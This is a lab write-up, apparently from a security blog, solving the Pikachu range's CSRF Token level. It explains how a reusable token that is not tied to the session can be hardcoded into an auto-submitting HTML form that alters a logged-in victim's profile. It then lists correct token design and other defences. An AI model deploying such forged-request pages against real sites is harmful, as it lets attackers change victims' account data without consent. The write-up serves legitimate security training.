---
title: Pikachu CSRF - CSRF Token
date: 2026-10-29
categories: [Web安全, 靶场Writeup]
tags: [Pikachu, CSRF, Token绕过, 逻辑漏洞]
---

## 题目: Pikachu CSRF - CSRF Token

## 题目描述
这是一个用户登录页面。登录后可以修改个人信息。本关引入了 CSRF Token 机制进行防御，要求寻找 Token 机制的缺陷，绕过防御并篡改受害者信息。

## 解题思路
CSRF Token 的正确防御逻辑是：每次修改信息时，请求必须携带一个随机生成的 Token，且该 Token 必须与当前用户的 Session 严格绑定。
如果后端只验证 Token 的有效性，却**没有将其与当前用户强绑定**，或者**Token 可以被重复使用**，攻击者就可以先获取一个合法的 Token，然后把它硬编码到恶意页面中，去攻击其他用户。

## 解题步骤

**1. 登录并抓包分析**
* 使用测试账号（如 `kobe / 123456`）登录。
* 进入修改个人信息页面，按 `F12` 查看网页源码，或者在 Burp Suite 中抓包。
* 发现表单中多了一个隐藏的 `<input type="hidden" name="token" value="xxxxx">`，这就是 CSRF Token。

**2. 测试 Token 机制（寻找逻辑缺陷）**
* 刷新页面，发现 Token 会发生变化。
* 但通过测试发现，该 Token **并没有与当前用户的 Session 严格绑定**，也没有做一次性销毁（防重放）。这意味着攻击者可以获取一个合法 Token 并一直使用它。

**3. 构造恶意 HTML 页面**
* 获取当前页面表单中的合法 Token 值（例如 `112406ae36600968b0702418088`）。
* 在本地编写一个恶意 HTML 文件（`csrf_token.html`），将表单提交的地址指向 `csrf_token_edit.php`，并把合法 Token 写死在隐藏域中：
  ```h0tml
  <html>
    <body>
      <form id="csrf-form" action="http://127.0.0.1/pikachu/vul/csrf/csrftoken/csrf_token_edit.php" method="POST">
        <input type="hidden" name="sex" value="hacker">
        <input type="hidden" name="phonenum" value="110">
        <input type="hidden" name="add" value="hacked">
        <input type="hidden" name="email" value="1@1.com">
        <!-- 填入获取到的合法 Token -->
        <input type="hidden" name="token" value="112406ae36600968b0702418088">
        <input type="hidden" name="submit" value="submit">
      </form>
      <script>
        document.getElementById("csrf-form").submit();
      </script>
    </body>
  </html>
  ```
4. 触发攻击并验证
保持浏览器中测试账号处于登录状态。
在同一个浏览器中，打开构造好的恶意 HTML 文件。页面会瞬间白屏，JS 自动提交了 POST 请求。
回到靶场刷新页面，发现个人信息已被成功篡改为 hacker、110、hacked，证明 CSRF Token 防御被成功绕过。

## 知识点总结
### CSRF Token 的正确实现：
- Token 必须是随机且不可预测的。
- 必须与当前用户的 Session 强绑定（不能用别人的 Token，也不能跨会话使用）。
- 每次提交后都应该刷新并销毁旧 Token（防重放攻击）。

### Token 绕过的常见场景：
- Token 未与用户绑定（如本例，获取一次即可无限使用）。
- Token 可以被无限次复用（没有防重放机制）。
- 后端未强制校验 Token 字段（漏判空值）。

### 防御策略： 
严格实现 Token 的随机性、一次性、强绑定。
结合 Referer 校验。
对敏感操作增加二次身份验证（如修改密码需输入原密码）。
